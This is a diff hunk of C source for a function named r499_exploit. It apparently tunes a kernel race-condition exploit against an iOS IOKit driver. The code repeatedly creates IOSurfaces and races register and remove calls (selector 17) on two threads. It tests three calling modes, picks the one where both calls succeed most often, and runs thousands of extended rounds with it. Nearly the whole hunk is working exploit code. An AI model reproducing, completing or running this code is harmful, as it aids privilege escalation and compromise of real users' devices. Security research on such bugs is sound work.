@@ -27199,108 +27199,120 @@ static void r499_exploit(void) {
     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake2);
     mach_port_insert_right(mach_task_self(), wake2, wake2, MACH_MSG_TYPE_MAKE_SEND);
 
-    /* Phase 2a: Try SYNC first (may work on iOS 27.1) */
-    rlog("  Phase 2a: Sync race (%d rounds)\n", race_rounds / 2);
-    int sync_ok = 0, sync_fail = 0;
+    /* Test all 3 modes to find which works on this device */
+    struct { const char *name; int reg_mode; int rem_mode; } modes[] = {
+        { "mode0: reg=sync_scalar rem=sync_scalar", 0, 0 },
+        { "mode1: reg=async rem=async", 1, 1 },
+        { "mode2: reg=sync_scalar rem=sync_struct24", 0, 2 },
+    };
+    int best_mode = -1, best_both_ok = 0;
 
-    for (int round = 0; round < race_rounds / 2; round++) {
+    for (int mi = 0; mi < 3; mi++) {
+        int m_both_ok = 0, m_reg_fail = 0, m_rem_fail = 0, m_both_fail = 0;
+        int test_rounds = 500;
+
+        rlog("  Testing %s (%d rounds)\n", modes[mi].name, test_rounds);
+        for (int round = 0; round < test_rounds; round++) {
+            IOSurfaceRef s = IOSurfaceCreate(props);
+            if (!s) continue;
+            uint32_t sid = IOSurfaceGetID(s);
+
+            /* Pre-register with correct format: 3 scalars, 24B out */
+            uint64_t pre_si[3] = { sid, 0, 0 };
+            uint8_t pre_out[24] = {0};
+            size_t pre_out_sz = 24;
+            IOConnectCallMethod(conn, 17, pre_si, 3, NULL, 0,
+                NULL, NULL, pre_out, &pre_out_sz);
+
+            volatile int go = 0;
+            struct r499_race_ctx reg_ctx = { .conn = conn2, .surface_id = sid,
+                .wake_port = wake2, .go = &go, .done = 0, .mode = modes[mi].reg_mode };
+            struct r499_race_ctx rem_ctx = { .conn = conn, .surface_id = sid,
+                .wake_port = wake1, .go = &go, .done = 0, .mode = modes[mi].rem_mode };
+
+            pthread_t t_reg, t_rem;
+            pthread_create(&t_reg, NULL, r499_register_thread, &reg_ctx);
+            pthread_create(&t_rem, NULL, r499_remove_thread, &rem_ctx);
+            usleep(5);
+            __sync_synchronize();
+            go = 1;
+            pthread_join(t_reg, NULL);
+            pthread_join(t_rem, NULL);
+
+            int reg_ok = (reg_ctx.kr == KERN_SUCCESS);
+            int rem_ok = (rem_ctx.kr == KERN_SUCCESS);
+            if (reg_ok && rem_ok) m_both_ok++;
+            else if (!reg_ok && rem_ok) m_reg_fail++;
+            else if (reg_ok && !rem_ok) m_rem_fail++;
+            else m_both_fail++;
+
+            CFRelease(s);
+        }
+
+        rlog("    Result: both_ok=%d reg_fail=%d rem_fail=%d both_fail=%d\n",
+            m_both_ok, m_reg_fail, m_rem_fail, m_both_fail);
+
+        if (m_both_ok > best_both_ok) {
+            best_both_ok = m_both_ok;
+            best_mode = mi;
+        }
+        r_both_ok += m_both_ok;
+        r_reg_fail += m_reg_fail;
+        r_rem_fail += m_rem_fail;
+        r_both_fail += m_both_fail;
+        r_interesting += m_both_ok;
+    }
+
+    rlog("\n  Best mode: %d (%s) with %d both_ok\n",
+        best_mode, best_mode >= 0 ? modes[best_mode].name : "none", best_both_ok);
+
+    int best_reg_mode = best_mode >= 0 ? modes[best_mode].reg_mode : 0;
+    int best_rem_mode = best_mode >= 0 ? modes[best_mode].rem_mode : 2;
+
+    /* Run more rounds with best mode */
+    int ext_rounds = race_rounds - 1500;
+    if (ext_rounds < 0) ext_rounds = 0;
+    rlog("  Running %d extended rounds...\n", ext_rounds);
+    int ext_both_ok = 0;
+    for (int round = 0; round < ext_rounds; round++) {
         IOSurfaceRef s = IOSurfaceCreate(props);
         if (!s) continue;
         uint32_t sid = IOSurfaceGetID(s);
 
-        /* Pre-register */
-        uint64_t pre_si[2] = { sid, 0 };
-        uint32_t pre_oc = 0;
-        IOConnectCallMethod(conn, 17, pre_si, 2, NULL, 0, NULL, &pre_oc, NULL, NULL);
+        uint64_t pre_si[3] = { sid, 0, 0 };
+        uint8_t pre_out[24] = {0};
+        size_t pre_out_sz = 24;
+        IOConnectCallMethod(conn, 17, pre_si, 3, NULL, 0,
+            NULL, NULL, pre_out, &pre_out_sz);
 
         volatile int go = 0;
         struct r499_race_ctx reg_ctx = { .conn = conn2, .surface_id = sid,
-            .wake_port = MACH_PORT_NULL, .go = &go, .done = 0, .mode = 0 };
+            .wake_port = wake2, .go = &go, .done = 0, .mode = best_reg_mode };
         struct r499_race_ctx rem_ctx = { .conn = conn, .surface_id = sid,
-            .wake_port = MACH_PORT_NULL, .go = &go, .done = 0, .mode = 0 };
+            .wake_port = wake1, .go = &go, .done = 0, .mode = best_rem_mode };
 
         pthread_t t_reg, t_rem;
         pthread_create(&t_reg, NULL, r499_register_thread, &reg_ctx);
         pthread_create(&t_rem, NULL, r499_remove_thread, &rem_ctx);
-        usleep(10);
+        usleep(3);
         __sync_synchronize();
         go = 1;
         pthread_join(t_reg, NULL);
         pthread_join(t_rem, NULL);
 
-        int reg_ok = (reg_ctx.kr == KERN_SUCCESS);
-        int rem_ok = (rem_ctx.kr == KERN_SUCCESS);
-        if (reg_ok && rem_ok) { r_both_ok++; sync_ok++; }
-        else if (!reg_ok && rem_ok) r_reg_fail++;
-        else if (reg_ok && !rem_ok) r_rem_fail++;
-        else { r_both_fail++; sync_fail++; }
-
-        if (reg_ok && rem_ok) r_interesting++;
+        if (reg_ctx.kr == KERN_SUCCESS && rem_ctx.kr == KERN_SUCCESS)
+            ext_both_ok++;
 
         CFRelease(s);
-
-        if (round == 99) {
-            rlog("    sync@100: both_ok=%d reg_fail=%d rem_fail=%d both_fail=%d\n",
-                r_both_ok, r_reg_fail, r_rem_fail, r_both_fail);
+        if (round > 0 && round % 2000 == 0) {
+            rlog("    ext round %d: both_ok=%d\n", round, ext_both_ok);
             fflush(stdout);
         }
     }
-    rlog("  Phase 2a sync result: ok=%d fail=%d\n\n", sync_ok, sync_fail);
+    r_both_ok += ext_both_ok;
+    r_interesting += ext_both_ok;
 
-    /* Phase 2b: Try ASYNC (the historically correct method) */
-    rlog("  Phase 2b: Async race (%d rounds)\n", race_rounds / 2);
-    int async_both_ok = 0, async_reg_fail = 0, async_rem_fail = 0, async_both_fail = 0;
-
-    for (int round = 0; round < race_rounds / 2; round++) {
-        IOSurfaceRef s = IOSurfaceCreate(props);
-        if (!s) continue;
-        uint32_t sid = IOSurfaceGetID(s);
-
-        /* Pre-register with async method */
-        uint64_t aref[1] = { 0 };
-        uint64_t asi[1] = { sid };
-        IOConnectCallAsyncMethod(conn, 17, wake1, aref, 1,
-            asi, 1, NULL, 0, NULL, NULL, NULL, NULL);
-
-        volatile int go = 0;
-        struct r499_race_ctx reg_ctx = { .conn = conn2, .surface_id = sid,
-            .wake_port = wake2, .go = &go, .done = 0, .mode = 1 };
-        struct r499_race_ctx rem_ctx = { .conn = conn, .surface_id = sid,
-            .wake_port = wake1, .go = &go, .done = 0, .mode = 1 };
-
-        pthread_t t_reg, t_rem;
-        pthread_create(&t_reg, NULL, r499_register_thread, &reg_ctx);
-        pthread_create(&t_rem, NULL, r499_remove_thread, &rem_ctx);
-        usleep(10);
-        __sync_synchronize();
-        go = 1;
-        pthread_join(t_reg, NULL);
-        pthread_join(t_rem, NULL);
-
-        int reg_ok = (reg_ctx.kr == KERN_SUCCESS);
-        int rem_ok = (rem_ctx.kr == KERN_SUCCESS);
-        if (reg_ok && rem_ok) { async_both_ok++; r_interesting++; }
-        else if (!reg_ok && rem_ok) async_reg_fail++;
-        else if (reg_ok && !rem_ok) async_rem_fail++;
-        else async_both_fail++;
-
-        CFRelease(s);
-
-        if (round == 99) {
-            rlog("    async@100: both_ok=%d reg_fail=%d rem_fail=%d both_fail=%d\n",
-                async_both_ok, async_reg_fail, async_rem_fail, async_both_fail);
-            fflush(stdout);
-        }
-    }
-    rlog("  Phase 2b async result: both_ok=%d reg_fail=%d rem_fail=%d both_fail=%d\n\n",
-        async_both_ok, async_reg_fail, async_rem_fail, async_both_fail);
-
-    r_both_ok += async_both_ok;
-
-    rlog("Phase 2 combined result (%d rounds):\n", race_rounds);
-    rlog("  sync_both_ok=%d async_both_ok=%d total_interesting=%d\n",
-        sync_ok, async_both_ok, r_interesting);
-    rlog("\n");
+    rlog("\nPhase 2 total: both_ok=%d interesting=%d\n\n", r_both_ok, r_interesting);
     fflush(stdout);
 
     mach_port_deallocate(mach_task_self(), wake1);
